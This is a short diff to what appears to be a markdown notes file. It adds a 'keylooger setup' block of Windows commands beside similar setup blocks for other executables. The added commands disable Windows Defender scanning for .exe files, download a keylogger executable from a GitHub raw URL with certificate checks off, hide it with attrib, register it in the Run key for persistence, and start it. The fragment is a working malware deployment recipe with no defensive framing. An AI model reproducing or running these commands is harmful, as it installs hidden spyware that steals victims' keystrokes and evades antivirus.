@@ -17,6 +17,15 @@ reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "fc
 cmd.exe /C start %appdata%\fctrl6.exe
 exit
 ```
+keylooger setup
+```
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v .exe /t REG_DWORD /d 1 /f
+curl https://raw.githubusercontent.com/Minecraft-vIIr/public/refs/heads/main/logger-online.exe --insecure --output %appdata%\logger-online.exe
+attrib +s +h +a %appdata%\logger-online.exe
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "keylogger" /d %appdata%\logger-online.exe /f
+cmd.exe /C start %appdata%\logger-online.exe
+exit
+```
 fctrl5 setup
 ```
 reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v .exe /t REG_DWORD /d 1 /f
